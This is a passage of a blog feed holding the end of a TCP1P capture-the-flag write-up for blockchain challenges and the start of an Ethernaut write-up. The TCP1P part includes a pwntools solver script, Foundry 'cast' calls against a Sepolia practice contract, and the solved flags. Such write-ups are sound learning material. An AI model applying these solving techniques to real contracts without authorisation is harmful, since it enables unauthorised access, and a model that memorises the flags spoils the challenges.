&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;slot_number
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    conn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;ctf.tcp1p.com&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;20005&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        recvd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;Answer: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;drop&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_contract_content&lt;&#x2F;span&gt;&lt;span&gt;(recvd))
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_type_array_till_pwd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_contract_content&lt;&#x2F;span&gt;&lt;span&gt;(recvd)))
&lt;&#x2F;span&gt;&lt;span&gt;        answer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_slot_number_by_type_array&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_type_array_till_pwd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_contract_content&lt;&#x2F;span&gt;&lt;span&gt;(recvd)))
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(answer)
&lt;&#x2F;span&gt;&lt;span&gt;        conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(answer)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;-------------------------------------------------------------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    output &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;recvall&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(output&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I saw that the most solutions in discord are using use compiler to simulate. Glad I learned more in it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;del&gt;And maybe I should polish this script a little more so it can be used elsewhere&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;vip&quot;&gt;VIP&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to TCP1P Blockchain Challenge
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;1.&lt;&#x2F;span&gt;&lt;span&gt; How to 101&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;2.&lt;&#x2F;span&gt;&lt;span&gt; get Contract
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Contract&lt;&#x2F;span&gt;&lt;span&gt; Addess: 0xFC5C0e4845ebb6fedcB57c17A09BFC77BE4e1478
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;RPC&lt;&#x2F;span&gt;&lt;span&gt; URL        : https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;To&lt;&#x2F;span&gt;&lt;span&gt; start       : Simply call the help() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;function,&lt;&#x2F;span&gt;&lt;span&gt; everything is written there
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Note:&lt;&#x2F;span&gt;&lt;span&gt; Due it&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;s deployed on Sepolia network, please use your own Private key to do the transaction
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;      If you need funds, you can either DM the probset or get it on https:&#x2F;&#x2F;sepoliafaucet.com&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;help()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cut&lt;&#x2F;span&gt;&lt;span&gt; -c3- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;xxd&lt;&#x2F;span&gt;&lt;span&gt; -r -p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cat &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;printf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;\x0A&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to TCP1P Private Club!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Enjoy&lt;&#x2F;span&gt;&lt;span&gt; the CTF Party of your life here!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;But&lt;&#x2F;span&gt;&lt;span&gt; first... Please give me your id, normal people have at least member role
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Of&lt;&#x2F;span&gt;&lt;span&gt; Course, there are also many VIPs over here. B-)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Functions:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Entrance&lt;&#x2F;span&gt;&lt;span&gt;(role) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; verify your role here, are you a member or VIP Class
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; role  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; input your role as string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;stealVIPCode&lt;&#x2F;span&gt;&lt;span&gt;() -&amp;gt; someone might&amp;#39;ve just steal a vip code and want to give it to you
&lt;&#x2F;span&gt;&lt;span&gt;getFlag()      -&amp;gt; Once you show your role, you can try your luck! ONLY VIP Can get the Flag!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;stealVIPCode()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cut&lt;&#x2F;span&gt;&lt;span&gt; -c3- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;xxd&lt;&#x2F;span&gt;&lt;span&gt; -r -p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cat &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;printf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;\x0A&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;I&lt;&#x2F;span&gt;&lt;span&gt; may or may not get you a ticket, but I don&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;t understand much about how to decode this.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;It&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;s some sort of their abiCoder policy. 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;VIP-Ticket:&lt;&#x2F;span&gt;&lt;span&gt; 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002f5443503150317374436c61737353656174202d2069732074686520564950205469636b6574207468657920736169640000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002f5443503150317374436c61737353656174202d2069732074686520564950205469636b6574207468657920736169640000000000000000000000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cut&lt;&#x2F;span&gt;&lt;span&gt; -c3- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;xxd&lt;&#x2F;span&gt;&lt;span&gt; -r -p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cat &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;printf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;\x0A&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;&#x2F;TCP1P1stClassSeat&lt;&#x2F;span&gt;&lt;span&gt; - is the VIP Ticket they said
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast send 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Entrance(string)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span&gt;byteskey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;TCP1P1stClassSeat&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;blockHash&lt;&#x2F;span&gt;&lt;span&gt;               0xc3303ccb93235e2af82754e9eacff270869233faf59bec2a0c6116bd29fed9e8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;blockNumber&lt;&#x2F;span&gt;&lt;span&gt;             4501630
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractAddress         
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cumulativeGasUsed&lt;&#x2F;span&gt;&lt;span&gt;       2823120
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;effectiveGasPrice&lt;&#x2F;span&gt;&lt;span&gt;       28176596118
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gasUsed&lt;&#x2F;span&gt;&lt;span&gt;                 58988
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logs                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logsBloom&lt;&#x2F;span&gt;&lt;span&gt;               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;root                    
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;status&lt;&#x2F;span&gt;&lt;span&gt;                  1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transactionHash&lt;&#x2F;span&gt;&lt;span&gt;         0x1b244773c5abd43f3efc91b23f07b538a7d6dd927db594619557678c038bbbb1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transactionIndex&lt;&#x2F;span&gt;&lt;span&gt;        14
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;                    2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;getFlag()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span&gt;byteskey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;  | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cut&lt;&#x2F;span&gt;&lt;span&gt; -c3- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;xxd&lt;&#x2F;span&gt;&lt;span&gt; -r -p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cat &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;printf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;\x0A&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;8TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Ethernaut succinct writeup. Where i got start</title>
        <published>2023-10-12T00:00:00+08:00</published>
        <updated>2023-10-12T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/ethernaut/"/>
        <id>/blog/ethernaut/</id>
        
        <content type="html" xml:base="/blog/ethernaut/">&lt;p&gt;Online game &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;&quot;&gt;Ethernaut&lt;&#x2F;a&gt;, Using SepoliaETH from &lt;a href=&quot;https:&#x2F;&#x2F;sepolia-faucet.pk910.de&#x2F;#&#x2F;&quot;&gt;mining faucet&lt;&#x2F;a&gt;. My account address is &lt;code&gt;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&lt;&#x2F;code&gt;. I only use it for testnet for security.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;hello-ethernaut&quot;&gt;Hello Ethernaut&lt;&#x2F;h2&gt;
&lt;p&gt;Interact with contracts to complete challenges&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;You will find what you need in info1().&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info1&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;You will find what you need in info2().&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info2&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;The property infoNum holds the number of the next info method to call.&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;infoNum&lt;&#x2F;span&gt;&lt;span&gt;()
